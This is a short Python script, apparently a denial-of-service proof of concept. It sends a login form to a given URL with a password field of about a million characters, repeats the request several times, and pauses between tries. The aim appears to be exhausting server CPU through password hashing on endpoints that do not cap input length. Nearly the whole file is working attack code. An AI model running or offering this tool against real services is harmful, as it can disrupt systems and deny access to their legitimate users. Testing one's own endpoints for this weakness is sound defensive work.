import sys, argparse
import urllib.parse
from time import sleep
import tornado.httpclient

parser = argparse.ArgumentParser(description='Description here')
parser.add_argument('-u', '--url', dest='url', type=str, required=True,help='url')
parser.add_argument('-l', '--login', dest='login', type=str, required=True,help='login')
parser.add_argument('-s', '--size', dest='size', type=int, default=1000000, help='Size of the password')
parser.add_argument('-d','--delay', dest='delay', type=int, default=1, help='Time between requests in seconds')
parser.add_argument('-r','--repeats', dest='repeats', type=int, default=20, help='Number of iterations')

args = parser.parse_args()

# @todo Make this asynchronous
#http_client = tornado.httpclient.AsyncHTTPClient()
http_client = tornado.httpclient.HTTPClient()
sys.stderr.write("Generating password...\n")
password = "x" * args.size
sys.stderr.write("Done! Password length: "+ str(len(password)) +" characters.\n")

post_data = { 'login': args.login, 'password': password }

body = urllib.parse.urlencode(post_data)


req = tornado.httpclient.HTTPRequest(
    url = args.url,
    method = "POST",
    body = body
)

for i in range(args.repeats):
    sys.stderr.write("Sending password "+str(i+1)+": "+str(args.size)+" bytes\n")
    try:
        http_client.fetch(req)
        sleep(args.delay)
    except Exception as e:
        sys.stderr.write("Error: " + str(e))

http_client.close()
sys.exit()

'''
def callback(response):
    if response.error:
        sys.stderr.write("Error: " + response.error)
    else:
        sys.stderr.write(response.body)
'''